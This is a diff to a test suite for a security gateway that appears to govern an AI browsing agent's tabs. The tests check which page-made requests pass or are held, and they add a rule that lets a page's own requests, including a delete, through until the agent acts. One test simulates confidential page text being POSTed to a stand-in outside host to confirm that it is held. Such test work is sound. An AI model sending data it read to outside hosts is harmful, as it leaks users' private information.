@@ -6,7 +6,7 @@ import { ROUTES, TOOLS } from "@crossbar/shared";
 import { startTestApp, sleep, type FakeTab, type FakePool } from "./helpers.ts";
 import { HUMAN_ONLY, mcpTools } from "../src/capabilities.ts";
 import { UNUSED_REVOKE_MS } from "../src/tokens.ts";
-import { classify, carriesData } from "../src/agent.ts";
+import { classify, carriesData, TRIGGER_WINDOW_MS } from "../src/agent.ts";
 
 type T = Awaited<ReturnType<typeof startTestApp>>;
 
@@ -244,6 +244,33 @@ describe("server security rules", () => {
     assert.deepEqual([leak.verdict, leak.rule], ["hold", "taint_exit"]);
   });
 
+  test("ADR 0031: the page's own requests pass until the agent acts on the page; after that, send/pay/delete still ask", async () => {
+    t.services.sites.set("alice", { pattern: "reddit.com", level: "read_as_you" }, "user");
+    pool.pages.set("https://old.reddit.com/r/z", { content: "the quarterly numbers for the northwest region are confidential" });
+    const c = await t.mcpClient(t.token("alice", "act"));
+    await c.call("open", { url: "https://old.reddit.com/r/z" });
+    await c.call("read");
+    const tab = lastTab("personal");
+    const post = (url: string, postData = "a=1") => tab.simulate({ method: "POST", url, resourceType: "XHR", postData });
+    // Nothing the agent did can be behind these: even a "message" passes (live: Gmail's taskassist:compose,
+    // a settings fetch, held on every load).
+    const assist = post("https://www.reddit.com/v2/assist:compose");
+    assert.deepEqual([assist.verdict, assist.rule], ["allow", "page_before_agent_acted"]);
+    // Read text going back to the site it was read on leaks nothing (live: Gmail's jserror reports).
+    assert.equal(post("https://www.reddit.com/jserror", "e=the+quarterly+numbers+for+the+northwest+region").verdict, "allow");
+    // Leaving the site with it is still held.
+    assert.equal(post("https://tracker.example/c", "e=the+quarterly+numbers+for+the+northwest+region").verdict, "hold");
+    // The agent acts on the page; long after the click, a send is still looked at (Gmail's Undo Send waits
+    // 5-30 s), while ordinary background writes pass.
+    await c.call("type", { ref: "e3", text: "hi" });
+    await sleep(TRIGGER_WINDOW_MS + 100);
+    assert.equal(post("https://www.reddit.com/v2/assist:compose").verdict, "hold");
+    assert.equal(post("https://www.reddit.com/api/sync").rule, "page_background");
+    // A new page starts clean.
+    tab.simulate({ url: "https://old.reddit.com/r/z2", resourceType: "Document" });
+    assert.equal(post("https://www.reddit.com/v2/assist:compose").rule, "page_before_agent_acted");
+  });
+
   test("activity records data shapes, not values; agents see only their own rows", async () => {
     pool.pages.set("https://forum.example/", { onClick: { e1: { method: "POST", url: "https://forum.example/api/comment?draft=1", resourceType: "XHR", postData: JSON.stringify({ text: "my secret reply", n: 3 }) } } });
     const tokA = t.token("alice", "act", "agent-a");
@@ -306,7 +333,10 @@ describe("server security rules", () => {
     const tab = [...pool.tabs].reverse()[0]!;
     // The page by itself: passes as it would with the person in front of it (ADR 0027); no ticket, no push.
     assert.equal(tab.simulate({ method: "POST", url: "https://forum.example/api/track", resourceType: "XHR", postData: "a=1" }).rule, "page_background");
-    // A page-made request that does need a person (here a payment nobody clicked for) is held, without a push.
+    // A page-made request that does need a person (a payment, after the agent has acted on the page: ADR 0031)
+    // is held, without a push.
+    await c.call("type", { ref: "e5", text: "x" });
+    await sleep(TRIGGER_WINDOW_MS + 100);
     tab.simulate({ method: "POST", url: "https://forum.example/checkout/confirm", resourceType: "XHR", postData: "a=1" });
     await sleep(30);
     assert.ok(t.services.tickets.listOpen("alice").some((x) => (x.facts as { path?: string }).path === "/checkout/confirm"));
@@ -694,9 +724,9 @@ describe("live Reddit findings (11 Nov 2026)", () => {
     assert.deepEqual([gql.verdict, gql.rule], ["allow", "page_background"]);
     assert.equal(t.services.tickets.listOpen("alice").length, before, "background traffic created tickets");
     assert.equal(((await c.call("list_flags")).data as unknown as unknown[]).length, 0, "quiet refusals flagged domains");
-    // Something no page does by itself still waits behind the wall, quietly.
+    // The agent hasn't acted on this page, so even a delete is the page's own (ADR 0031): no ticket.
     const del = tab.simulate({ method: "POST", url: "https://www.reddit.com/api/delete", resourceType: "Fetch", postData: "id=t3_x" });
-    assert.deepEqual([del.verdict, del.rule], ["deny", "tab_blocked"]);
+    assert.deepEqual([del.verdict, del.rule], ["allow", "page_before_agent_acted"]);
   });
 });
 
@@ -709,7 +739,9 @@ describe("approval cards say who triggered the request", () => {
     const c = await t.mcpClient(t.token("alice", "act"));
     await c.call("open", { url: "https://forum.example/t/1" });
     const tab = [...pool.tabs].reverse()[0]!;
-    // The page, by itself, long after any agent action, doing something no page does without a click.
+    // The page, by itself, long after the agent acted on it, doing something no page does without a click (ADR 0031).
+    await c.call("type", { ref: "e5", text: "x" });
+    await sleep(TRIGGER_WINDOW_MS + 100);
     const blob = JSON.stringify({ lst: ["rec", 10, { "1": { str: "message" }, "2": { str: "consume" }, pad: "x".repeat(500) }] });
     tab.simulate({ method: "POST", url: "https://forum.example/checkout/track", resourceType: "XHR", postData: blob });
     await sleep(30);
@@ -838,6 +870,8 @@ describe("classifying requests (live finding, 12 Nov 2026)", () => {
     const c = await t.mcpClient(t.token("alice", "act"));
     await c.call("open", { url: "https://forum.example/t/1" });
     const tab = [...pool.tabs].reverse()[0]!;
+    await c.call("type", { ref: "e5", text: "x" });
+    await sleep(TRIGGER_WINDOW_MS + 100);
     const h = tab.simulate({ method: "POST", url: "https://forum.example/checkout/confirm", resourceType: "XHR", postData: "a=1" });
     assert.equal(h.verdict, "hold");
     await sleep(20);
